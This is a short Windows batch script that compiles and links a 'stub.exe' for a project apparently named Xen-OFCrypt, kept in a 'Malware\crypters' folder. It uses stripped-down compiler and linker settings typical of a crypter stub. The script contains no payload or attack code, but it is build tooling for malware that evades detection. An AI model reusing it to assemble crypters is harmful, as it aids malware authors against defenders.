@echo off
call "D:\Development\Visual Studio\Community\VC\Auxiliary\Build\vcvarsall.bat" x64 >nul 2>&1
cd /d "D:\Development\projects\Malware\crypters\Xen-OFCrypt"
if not exist "build\obj" mkdir build\obj
if not exist "build\out" mkdir build\out

echo [1/3] Compiling Crypto.cpp
cl.exe /nologo /W4 /O2 /MT /GS- /Zl /DNDEBUG /D_WIN64 /EHs-c- /GR- /utf-8 /c /Fo"build\obj\Crypto.obj" "Stub\Crypto.cpp"
if errorlevel 1 echo CRYPTO COMPILE FAILED && exit /b 1

echo [2/3] Compiling Entry.cpp
cl.exe /nologo /W4 /O2 /MT /GS- /Zl /DNDEBUG /D_WIN64 /EHs-c- /GR- /utf-8 /c /Fo"build\obj\Entry.obj" "Stub\Entry.cpp"
if errorlevel 1 echo ENTRY COMPILE FAILED && exit /b 1

echo [3/3] Linking
set OBJFILES=
for %%F in (build\obj\*.obj) do set OBJFILES=!OBJFILES! %%F
link.exe /nologo /SUBSYSTEM:WINDOWS /NODEFAULTLIB /MERGE:.rdata=.text /ENTRY:WinMain /OUT:"build\out\stub.exe" build\obj\*.obj kernel32.lib user32.lib advapi32.lib ole32.lib ntdll.lib bcrypt.lib mscoree.lib
if errorlevel 1 echo LINK FAILED && exit /b 1

echo BUILD SUCCESS
dir build\out\stub.exe
